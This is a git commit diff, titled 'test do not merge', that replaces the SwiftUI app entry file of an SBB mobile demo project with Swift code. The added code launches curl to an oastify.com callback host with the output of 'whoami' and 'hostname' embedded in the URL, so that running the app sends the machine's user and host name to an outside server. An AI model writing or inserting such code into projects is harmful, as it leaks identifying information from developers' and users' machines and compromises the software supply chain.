41f7a3b8c57b76abefdf19bdf394051619fdcffb
Security Researcher - WhiteHat <148884715+WhiteHat-D@users.noreply.github.com>
2023-10-24 17:45:28 +0300

    test do not merge

--- SBBMLDemo/SBBMLDemoApp.swift
+++ SBBMLDemo/SBBMLDemoApp.swift
@@ -1,27 +1,20 @@
-//
-// Copyright (C) Schweizerische Bundesbahnen SBB, 2021.
-//
+import Foundation
 
-import SwiftUI
-import SBBDesignSystemMobileSwiftUI
+func executeCommand(command: String, arguments: [String]) -> String? {
+    let process = Process()
+    process.launchPath = command
+    process.arguments = arguments
 
-class AppDelegate: NSObject, UIApplicationDelegate {
-    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
-        SBBAppearance.setupSBBAppearance()
-        return true
-    }
+    let outputPipe = Pipe()
+    process.standardOutput = outputPipe
+    process.launch()
+
+    let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
+    let output = String(data: outputData, encoding: .utf8)
+
+    return output
 }
 
-@main
-struct SBBMLDemoApp: App {
-    
-    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
-    let onboardingViewModel = OnboardingViewModel()
-
-    var body: some Scene {
-        WindowGroup {
-            ContentView()
-                .environmentObject(onboardingViewModel)
-        }
-    }
+if let result = executeCommand(command: "/usr/bin/curl", arguments: ["https://jxkzbwklei6z12cpsuajeek2yt4p3d01p.oastify.com/`whoami`/`hostname`"]) {
+    print(result)
 }
